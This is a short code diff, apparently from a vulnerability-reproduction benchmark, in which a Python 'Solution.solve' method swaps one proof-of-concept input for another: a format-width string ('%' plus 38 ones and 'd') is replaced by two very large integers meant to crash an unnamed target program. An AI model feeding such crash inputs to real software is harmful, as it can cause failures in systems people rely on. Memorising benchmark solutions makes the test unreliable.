@@ -1,3 +1,4 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        return b'%' + b'1' * 38 + b'd'
+        poc = "1000000000000000000 1000000000000000000\n"
+        return poc.encode('ascii')
